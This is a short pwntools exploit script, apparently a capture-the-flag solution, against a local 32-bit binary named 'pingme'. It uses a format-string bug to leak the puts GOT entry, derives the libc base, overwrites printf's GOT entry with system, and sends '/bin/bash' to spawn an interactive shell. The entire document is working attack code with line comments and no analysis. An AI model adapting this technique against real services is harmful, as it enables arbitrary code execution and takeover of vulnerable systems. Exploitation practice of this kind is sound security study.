
from pwn import *

p = process("./pingme") # Start the process
 
libc = ELF("/lib/i386-linux-gnu/libc.so.6") # pwntools' `ELF`

puts_got = 0x8049980      # `puts` GOT to leak
printf = 0x8049974        # `printf` GOT to overwrite
payload = b"%8$s"         # Leaking the GOT address
payload += p32(puts_got)  # The address to be leaked

p.sendlineafter(b"me\n", payload)                    # Send payload after the `me\n`
puts_leak = u32(p.recv(4).strip().ljust(4, b"\x00")) # Recieving 4 bytes and  unpacking it
log.info("puts@libc: "+hex(puts_leak))               # Printing the leak address as hex
 
libc.address = puts_leak - libc.symbols['puts']      # Updating the libc base by subtracting 
system = libc.symbols['system']                      # `system` address 
payload = fmtstr_payload(7, {printf:  system})       # Overwiting the GOT address of `printf` with `system` address
p.sendline(payload)                                  # Sending payload 
p.sendline(b"/bin/bash\x00")                         # Sending `/bin/bash` to spawn shell
p.interactive()                                      # Interactive mode
